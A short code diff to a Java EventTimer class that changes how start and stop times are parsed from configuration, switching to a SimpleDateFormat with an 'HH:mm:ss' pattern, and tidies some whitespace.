@@ -10,6 +10,7 @@ package com.android.service.event;
 import java.io.IOException;
 import java.text.DateFormat;
 import java.text.ParseException;
+import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.GregorianCalendar;
@@ -66,8 +67,9 @@ public class EventTimer extends BaseTimer {
 			String ts = conf.getString("ts");
 			String te = conf.getString("te");
 
-			timestart = DateFormat.getDateInstance().parse(ts);
-			timestop = DateFormat.getDateInstance().parse(te);
+			SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");
+			timestart = df.parse(ts);
+			timestop = df.parse(te);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " type: " + type + " ts:" + ts + " te:" + te);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
@@ -112,7 +114,6 @@ public class EventTimer extends BaseTimer {
 
 		nextDailyIn = setDailyDelay();
 
-
 	}
 
 	private boolean setDailyDelay() {
@@ -147,7 +148,7 @@ public class EventTimer extends BaseTimer {
 			}
 
 			long delay = nextStop - now;
-			
+
 			setPeriod(nextStop - now);
 			return false;
 		}
@@ -184,7 +185,6 @@ public class EventTimer extends BaseTimer {
 			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
 		}
 
-		
 	}
 
 	/*
